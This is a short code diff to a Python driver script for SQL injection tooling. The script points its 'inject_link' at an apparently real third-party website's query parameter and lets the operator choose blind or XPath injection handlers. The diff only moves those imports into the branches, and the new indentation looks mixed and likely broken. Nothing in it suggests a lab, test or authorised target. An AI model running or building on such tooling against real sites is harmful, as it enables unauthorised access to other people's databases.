@@ -1,6 +1,6 @@
 from sqli import *
-from sqli_quick_blind import *
-from sqli_xpath import *
+
+
 
 ## Setting
 inject_link = 'http://coex.com.vn/?option=hotro&catId=121 '
@@ -10,11 +10,13 @@ column_name = ''
 method = raw_input("Method (1: Quick Blind; 2: XPATH): ")
 hdl = ''
 if method == "1":
+  from sqli_quick_blind import *
 	## Quick blind
 	hdl = SQLI_Quick_Blind()
 	hdl.initialize()
 	hdl.setLink(inject_link)
 elif method == "2":
+  from sqli_xpath import *
 	## Quick blind
 	hdl = SQLI_XPath()
 	hdl.initialize()
